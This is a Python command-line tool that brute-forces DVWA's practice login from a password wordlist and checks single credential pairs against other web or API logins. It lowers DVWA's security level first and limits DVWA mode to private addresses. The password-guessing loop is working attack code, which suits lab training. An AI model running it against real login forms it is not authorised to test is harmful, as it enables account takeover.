import argparse
import csv
import json
import os
import re
import time
from datetime import datetime

import httpx
from rich.console import Console
from rich.progress import Progress
from rich.table import Table

console = Console()


# ============================================================
# BASIC HELPERS
# ============================================================

def load_wordlist(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Wordlist not found: {path}")

    with open(path, "r", encoding="utf-8", errors="ignore") as file:
        return [line.strip() for line in file if line.strip()]


def is_private_target(url):
    url = url.lower().strip()

    allowed_prefixes = (
        "http://localhost",
        "http://127.0.0.1",
        "https://localhost",
        "https://127.0.0.1",
        "http://192.168.",
        "https://192.168.",
        "http://10.",
        "https://10.",
        "http://172.16.",
        "http://172.17.",
        "http://172.18.",
        "http://172.19.",
        "http://172.20.",
        "http://172.21.",
        "http://172.22.",
        "http://172.23.",
        "http://172.24.",
        "http://172.25.",
        "http://172.26.",
        "http://172.27.",
        "http://172.28.",
        "http://172.29.",
        "http://172.30.",
        "http://172.31.",
        "https://172.16.",
        "https://172.17.",
        "https://172.18.",
        "https://172.19.",
        "https://172.20.",
        "https://172.21.",
        "https://172.22.",
        "https://172.23.",
        "https://172.24.",
        "https://172.25.",
        "https://172.26.",
        "https://172.27.",
        "https://172.28.",
        "https://172.29.",
        "https://172.30.",
        "https://172.31.",
    )

    return url.startswith(allowed_prefixes)


# ============================================================
# CUSTOM PROFILE
# ============================================================

def collect_custom_profile():
    console.print(
        "\n[bold cyan]Customized Test Information[/bold cyan]\n"
    )

    profile = {
        "username": input("Username: ").strip(),
        "full_name": input("Full Name: ").strip(),
        "dob": input("DOB (DD-MM-YYYY): ").strip(),
        "email": input("Email: ").strip(),
        "test_id": input("Test ID: ").strip(),
    }

    return profile


# ============================================================
# REPORTING
# ============================================================

def save_reports(results, metadata):
    os.makedirs("reports", exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    json_file = f"reports/result_{timestamp}.json"
    csv_file = f"reports/result_{timestamp}.csv"

    report = {
        "metadata": metadata,
        "results": results,
    }

    with open(json_file, "w", encoding="utf-8") as file:
        json.dump(report, file, indent=4)

    csv_rows = []

    for result in results:
        row = result.copy()

        row["username"] = row.get("username", "")
        row["password"] = row.get("password", "")

        csv_rows.append(row)

    if csv_rows:
        fieldnames = sorted(
            {
                key
                for row in csv_rows
                for key in row.keys()
            }
        )

        with open(
            csv_file,
            "w",
            newline="",
            encoding="utf-8"
        ) as file:

            writer = csv.DictWriter(
                file,
                fieldnames=fieldnames,
                extrasaction="ignore",
            )

            writer.writeheader()
            writer.writerows(csv_rows)

    return json_file, csv_file


def show_results(results):
    table = Table(title="Security Assessment Results")

    table.add_column("Type")
    table.add_column("Username")
    table.add_column("HTTP")
    table.add_column("Time")
    table.add_column("Result")

    for result in results:

        success = result.get("success", False)

        if success:
            status = "[bold green]SUCCESS[/bold green]"
        else:
            status = "[red]FAILED[/red]"

        table.add_row(
            str(result.get("test_type", "")),
            str(result.get("username", "")),
            str(result.get("status_code", "")),
            str(result.get("time", "")),
            status,
        )

    console.print(table)


# ============================================================
# DVWA LOGIN
# ============================================================

def extract_user_token(html):
    patterns = [
        r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\']\s+name=["\']user_token["\']',
    ]

    for pattern in patterns:

        match = re.search(
            pattern,
            html,
            re.IGNORECASE,
        )

        if match:
            return match.group(1)

    return None


def login_to_dvwa(
    client,
    base_url,
    username,
    password,
):
    login_url = (
        f"{base_url.rstrip('/')}/login.php"
    )

    console.print(
        "\n[cyan]Step 1: Getting DVWA login page...[/cyan]"
    )

    response = client.get(login_url)

    if response.status_code != 200:

        console.print(
            f"[red]Could not open DVWA login page."
            f" HTTP {response.status_code}[/red]"
        )

        return False

    user_token = extract_user_token(
        response.text
    )

    data = {
        "username": username,
        "password": password,
        "Login": "Login",
    }

    if user_token:
        data["user_token"] = user_token

    console.print(
        "[cyan]Step 2: Logging into DVWA...[/cyan]"
    )

    response = client.post(
        login_url,
        data=data,
        follow_redirects=True,
    )

    final_url = str(response.url)

    if "/login.php" in final_url:

        console.print(
            "[red]DVWA login failed.[/red]"
        )

        return False

    console.print(
        "[green]DVWA login successful.[/green]"
    )

    return True


# ============================================================
# DVWA SECURITY LEVEL
# ============================================================

def set_security_low(client, base_url):

    security_url = (
        f"{base_url.rstrip('/')}/security.php"
    )

    try:

        response = client.get(
            security_url,
            follow_redirects=True,
        )

        if response.status_code != 200:
            return False

        data = {
            "security": "low",
            "seclev_submit": "Submit",
        }

        response = client.post(
            security_url,
            data=data,
            follow_redirects=True,
        )

        return response.status_code == 200

    except httpx.RequestError:
        return False


# ============================================================
# DVWA PASSWORD TEST
# ============================================================

def test_dvwa_password(
    client,
    base_url,
    username,
    password,
):

    endpoint = (
        f"{base_url.rstrip('/')}"
        "/vulnerabilities/brute/"
    )

    params = {
        "username": username,
        "password": password,
        "Login": "Login",
    }

    start = time.perf_counter()

    response = client.get(
        endpoint,
        params=params,
        follow_redirects=True,
    )

    elapsed = round(
        time.perf_counter() - start,
        4,
    )

    body = response.text.lower()

    failure_marker = (
        "username and/or password incorrect."
    )

    success_marker = (
        "welcome to the password protected area"
    )

    failed = failure_marker in body
    successful = success_marker in body

    if "/login.php" in str(response.url):
        successful = False

    if failed:
        successful = False

    return {
        "test_type": "DVWA",
        "username": username,
        "password": password,
        "status_code": response.status_code,
        "response_length": len(response.text),
        "time": elapsed,
        "success": successful,
    }


# ============================================================
# DVWA WORDLIST TEST
# ============================================================

def run_dvwa_wordlist_test(
    client,
    base_url,
    username,
    passwords,
    delay,
    test_type,
):

    results = []

    console.print(
        "\n[bold cyan]"
        f"Starting {test_type}..."
        "[/bold cyan]\n"
    )

    with Progress() as progress:

        task = progress.add_task(
            "Testing approved credentials...",
            total=len(passwords),
        )

        for password in passwords:

            try:

                result = test_dvwa_password(
                    client,
                    base_url,
                    username,
                    password,
                )

                result["test_type"] = test_type

                results.append(result)

                if result["success"]:

                    console.print(
                        "\n[bold green]"
                        f"[+] Approved credential matched: "
                        f"{username}:{password}"
                        "[/bold green]"
                    )

                    progress.advance(task)

                    break

                console.print(
                    f"[dim][-] Tested: {password}[/dim]"
                )

            except httpx.RequestError as error:

                console.print(
                    f"\n[red]Request error: "
                    f"{error}[/red]"
                )

                break

            progress.advance(task)

            time.sleep(delay)

    return results


# ============================================================
# CUSTOM WORDLIST
# ============================================================

def get_custom_wordlist():

    console.print(
        "\n[bold cyan]"
        "Choose an approved custom wordlist"
        "[/bold cyan]"
    )

    path = input(
        "Custom wordlist path: "
    ).strip()

    if not path:
        return []

    try:

        return load_wordlist(path)

    except FileNotFoundError as error:

        console.print(
            f"[red]{error}[/red]"
        )

        return []


# ============================================================
# GENERIC WEBSITE / API REQUEST
# ============================================================

def generic_request(
    client,
    url,
    method,
    username,
    password,
    username_field,
    password_field,
    headers,
    body_type,
):

    method = method.upper()

    if body_type == "json":

        payload = {
            username_field: username,
            password_field: password,
        }

        request_headers = headers.copy()

        request_headers.setdefault(
            "Content-Type",
            "application/json",
        )

        response = client.request(
            method,
            url,
            json=payload,
            headers=request_headers,
            follow_redirects=True,
        )

    else:

        payload = {
            username_field: username,
            password_field: password,
        }

        response = client.request(
            method,
            url,
            data=payload,
            headers=headers,
            follow_redirects=True,
        )

    return response


# ============================================================
# GENERIC AUTHENTICATION ASSESSMENT
# ============================================================

def run_generic_assessment(
    client,
    target_url,
    target_type,
    username,
    password,
    method,
    username_field,
    password_field,
    body_type,
    headers,
    success_marker,
    failure_marker,
):

    start = time.perf_counter()

    response = generic_request(
        client=client,
        url=target_url,
        method=method,
        username=username,
        password=password,
        username_field=username_field,
        password_field=password_field,
        headers=headers,
        body_type=body_type,
    )

    elapsed = round(
        time.perf_counter() - start,
        4,
    )

    body = response.text

    body_lower = body.lower()

    success = False

    if success_marker:
        success = (
            success_marker.lower()
            in body_lower
        )

    if failure_marker:

        if (
            failure_marker.lower()
            in body_lower
        ):
            success = False

    # Useful response classification
    rate_limited = (
        response.status_code == 429
    )

    authentication_failure = (
        response.status_code in (401, 403)
    )

    return {
        "test_type": target_type,
        "username": username,
        "password": password,
        "status_code": response.status_code,
        "response_length": len(body),
        "time": elapsed,
        "success": success,
        "rate_limited": rate_limited,
        "authentication_failure": authentication_failure,
        "redirect_url": str(response.url),
        "security_headers": {
            "content_security_policy":
                response.headers.get(
                    "content-security-policy",
                    "",
                ),
            "strict_transport_security":
                response.headers.get(
                    "strict-transport-security",
                    "",
                ),
            "x_content_type_options":
                response.headers.get(
                    "x-content-type-options",
                    "",
                ),
            "x_frame_options":
                response.headers.get(
                    "x-frame-options",
                    "",
                ),
        },
    }


# ============================================================
# EXPLICIT CREDENTIAL TEST
# ============================================================

def run_explicit_credential_test(
    client,
    target_url,
    target_type,
    username,
    password,
    method,
    username_field,
    password_field,
    body_type,
    headers,
    success_marker,
    failure_marker,
):

    console.print(
        "\n[bold cyan]"
        "Running approved credential assessment..."
        "[/bold cyan]"
    )

    try:

        result = run_generic_assessment(
            client=client,
            target_url=target_url,
            target_type=target_type,
            username=username,
            password=password,
            method=method,
            username_field=username_field,
            password_field=password_field,
            body_type=body_type,
            headers=headers,
            success_marker=success_marker,
            failure_marker=failure_marker,
        )

        if result["status_code"] == 429:

            console.print(
                "[yellow]"
                "Rate limit detected: HTTP 429"
                "[/yellow]"
            )

        elif result["status_code"] in (401, 403):

            console.print(
                "[yellow]"
                f"Authentication rejected: "
                f"HTTP {result['status_code']}"
                "[/yellow]"
            )

        elif result["success"]:

            console.print(
                "[bold green]"
                "Authentication indicator matched."
                "[/bold green]"
            )

        else:

            console.print(
                "[yellow]"
                "No successful authentication "
                "indicator detected."
                "[/yellow]"
            )

        return [result]

    except httpx.RequestError as error:

        console.print(
            f"[red]Request error: {error}[/red]"
        )

        return []


# ============================================================
# HEADERS
# ============================================================

def parse_headers(header_text):

    headers = {}

    if not header_text:
        return headers

    parts = header_text.split(";")

    for part in parts:

        if ":" not in part:
            continue

        key, value = part.split(
            ":",
            1,
        )

        headers[key.strip()] = value.strip()

    return headers


# ============================================================
# MAIN
# ============================================================

def main():

    parser = argparse.ArgumentParser(
        description=(
            "Authorized Web/API Authentication "
            "Security Assessment Tool"
        )
    )

    parser.add_argument(
        "--mode",
        choices=[
            "dvwa",
            "website",
            "api",
        ],
        required=True,
        help="Assessment mode",
    )

    parser.add_argument(
        "--url",
        required=True,
        help="Target URL",
    )

    parser.add_argument(
        "--username",
        help="Approved test username",
    )

    parser.add_argument(
        "--password",
        help="Approved test password",
    )

    parser.add_argument(
        "--wordlist",
        help=(
            "Approved local/private lab wordlist "
            "(DVWA mode only)"
        ),
    )

    parser.add_argument(
        "--method",
        default="POST",
        choices=[
            "GET",
            "POST",
            "PUT",
            "PATCH",
        ],
    )

    parser.add_argument(
        "--username-field",
        default="username",
    )

    parser.add_argument(
        "--password-field",
        default="password",
    )

    parser.add_argument(
        "--body-type",
        choices=[
            "form",
            "json",
        ],
        default="form",
    )

    parser.add_argument(
        "--headers",
        default="",
        help=(
            "Example: "
            "Authorization: Bearer TOKEN;"
            "X-Test: value"
        ),
    )

    parser.add_argument(
        "--success-marker",
        default="",
        help="Known success response marker",
    )

    parser.add_argument(
        "--failure-marker",
        default="",
        help="Known failure response marker",
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between local lab attempts",
    )

    args = parser.parse_args()

    # --------------------------------------------------------
    # DISPLAY
    # --------------------------------------------------------

    console.print(
        "\n"
        "[bold cyan]"
        "========================================"
        "[/bold cyan]"
    )

    console.print(
        "[bold cyan]"
        "   WEB & API AUTHENTICATION ASSESSMENT"
        "[/bold cyan]"
    )

    console.print(
        "[bold cyan]"
        "========================================"
        "[/bold cyan]\n"
    )

    console.print(
        f"Mode   : {args.mode.upper()}"
    )

    console.print(
        f"Target : {args.url}"
    )

    # --------------------------------------------------------
    # SAFETY RULE
    # --------------------------------------------------------

    if args.mode == "dvwa":

        if not is_private_target(args.url):

            console.print(
                "\n[bold red]"
                "DVWA password testing is restricted "
                "to local/private lab targets."
                "[/bold red]"
            )

            return

    # --------------------------------------------------------
    # METADATA
    # --------------------------------------------------------

    metadata = {
        "tool": (
            "Web & API Authentication "
            "Security Assessment Tool"
        ),
        "mode": args.mode,
        "target": args.url,
        "timestamp": datetime.now().isoformat(),
    }

    # --------------------------------------------------------
    # CLIENT
    # --------------------------------------------------------

    with httpx.Client(
        timeout=15,
        headers={
            "User-Agent":
                "Authorized-Security-Assessment-Tool/1.0"
        },
    ) as client:

        # ====================================================
        # DVWA MODE
        # ====================================================

        if args.mode == "dvwa":

            username = (
                args.username
                or "admin"
            )

            dvwa_password = (
                args.password
                or "password"
            )

            # -----------------------------------------------
            # Login
            # -----------------------------------------------

            logged_in = login_to_dvwa(
                client,
                args.url,
                username,
                dvwa_password,
            )

            if not logged_in:

                console.print(
                    "\n[bold red]"
                    "Stopping: DVWA authentication "
                    "failed."
                    "[/bold red]"
                )

                return

            # -----------------------------------------------
            # Security Low
            # -----------------------------------------------

            if set_security_low(
                client,
                args.url,
            ):

                console.print(
                    "[green]"
                    "DVWA security level set to Low."
                    "[/green]"
                )

            else:

                console.print(
                    "[yellow]"
                    "Could not automatically set "
                    "DVWA security level."
                    "[/yellow]"
                )

                console.print(
                    "[yellow]"
                    "Set DVWA Security to Low manually."
                    "[/yellow]"
                )

            # -----------------------------------------------
            # DEFAULT WORDLIST
            # -----------------------------------------------

            default_wordlist = (
                args.wordlist
                or "wordlists/dvwa_passwords.txt"
            )

            try:

                passwords = load_wordlist(
                    default_wordlist
                )

            except FileNotFoundError as error:

                console.print(
                    f"[red]{error}[/red]"
                )

                return

            console.print(
                "\n[bold cyan]"
                "DEFAULT WORDLIST TEST"
                "[/bold cyan]"
            )

            console.print(
                f"Username : {username}"
            )

            console.print(
                f"Wordlist : {default_wordlist}"
            )

            console.print(
                f"Candidates: {len(passwords)}"
            )

            results = run_dvwa_wordlist_test(
                client=client,
                base_url=args.url,
                username=username,
                passwords=passwords,
                delay=args.delay,
                test_type="Default Wordlist",
            )

            # -----------------------------------------------
            # FOUND?
            # -----------------------------------------------

            found = any(
                result.get("success")
                for result in results
            )

            if found:

                console.print(
                    "\n[bold green]"
                    "SUCCESS → Report → STOP"
                    "[/bold green]"
                )

            else:

                # -------------------------------------------
                # CUSTOMIZED TEST
                # -------------------------------------------

                console.print(
                    "\n[bold yellow]"
                    "Default wordlist did not match."
                    "[/bold yellow]"
                )

                console.print(
                    "\n[bold cyan]"
                    "CUSTOMIZED TEST"
                    "[/bold cyan]"
                )

                profile = (
                    collect_custom_profile()
                )

                metadata[
                    "custom_profile"
                ] = profile

                custom_passwords = (
                    get_custom_wordlist()
                )

                if custom_passwords:

                    custom_results = (
                        run_dvwa_wordlist_test(
                            client=client,
                            base_url=args.url,
                            username=profile[
                                "username"
                            ] or username,
                            passwords=custom_passwords,
                            delay=args.delay,
                            test_type=(
                                "Customized Test"
                            ),
                        )
                    )

                    results.extend(
                        custom_results
                    )

                else:

                    console.print(
                        "[yellow]"
                        "No custom wordlist supplied."
                        "[/yellow]"
                    )

        # ====================================================
        # WEBSITE / API MODE
        # ====================================================

        else:

            # Third-party Website/API:
            # explicit credential assessment only.

            if not args.username:
                console.print(
                    "[red]"
                    "Provide an approved test username "
                    "with --username."
                    "[/red]"
                )
                return

            if not args.password:
                console.print(
                    "[red]"
                    "Provide an approved test password "
                    "with --password."
                )
                return

            headers = parse_headers(
                args.headers
            )

            results = (
                run_explicit_credential_test(
                    client=client,
                    target_url=args.url,
                    target_type=args.mode.upper(),
                    username=args.username,
                    password=args.password,
                    method=args.method,
                    username_field=args.username_field,
                    password_field=args.password_field,
                    body_type=args.body_type,
                    headers=headers,
                    success_marker=args.success_marker,
                    failure_marker=args.failure_marker,
                )
            )

    # ========================================================
    # FINAL REPORT
    # ========================================================

    if results:

        console.print("\n")

        show_results(results)

        json_file, csv_file = save_reports(
            results,
            metadata,
        )

        console.print(
            f"\n[green]"
            f"JSON report: {json_file}"
            "[/green]"
        )

        console.print(
            f"[green]"
            f"CSV report: {csv_file}"
            "[/green]"
        )

    console.print(
        "\n[bold cyan]"
        "Assessment completed."
        "[/bold cyan]"
    )


if __name__ == "__main__":
    main()